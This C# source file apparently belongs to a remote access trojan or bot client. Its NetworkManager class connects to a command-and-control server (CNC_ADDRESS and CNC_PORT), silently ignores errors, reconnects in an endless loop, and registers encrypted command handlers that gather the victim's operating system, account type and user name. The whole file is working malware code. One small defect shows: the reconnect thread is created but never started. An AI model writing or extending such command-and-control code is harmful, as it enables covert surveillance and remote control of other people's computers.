using Client.Config;
using Client.Core.Events;
using Client.Core.Security;
using NetworkCommsDotNet;
using NetworkCommsDotNet.Connections;
using NetworkCommsDotNet.Connections.TCP;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client.Core.Networking
{
    class NetworkManager
    {
        public static Connection Connection;
        public static bool IsConnected
        {
            get
            {
                return Connection != null && Connection.ConnectionAlive();
            }
        }
        
        public static void Connect()
        {
            try
            {
                Connection = TCPConnection.GetConnection(new NetworkCommsDotNet.ConnectionInfo(Settings.CNC_ADDRESS, Settings.CNC_PORT));
                SetupHandlers();
            }
            catch
            {

            }
        }   

        public static void Disconnect()
        {
            if(Connection != null && Connection.ConnectionAlive())
            {
                Connection.CloseConnection(false);
                Connection = null;
            }
            else
            {
                Connection = null;
            }
        }


        public static void SetupHandlers()
        {
            Connection.AppendIncomingPacketHandler<string>("GetOperatingSystemReq", (packetHeader, connection, incomingData) =>
            {
                GetOperatingSystem.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("GetAccountTypeReq", (packetHeader, connection, incomingData) =>
            {
                GetAccountType.Execute(Cryptography.Decrypt(incomingData));
            });
            Connection.AppendIncomingPacketHandler<string>("GetUserNameReq", (packetHeader, connection, incomingData) =>
            {
                GetUserName.Execute(Cryptography.Decrypt(incomingData));
            });

        }

        private static void ConnectionChecker()
        {
            Thread t = new Thread(CheckConnection);
        }

        private static void CheckConnection()
        {
            while(true)
            {
                if(!IsConnected)
                {
                    Connect();
                }
                Thread.Sleep(Settings.CNC_RECONNECT_TIME);
            }
        }

    }
}
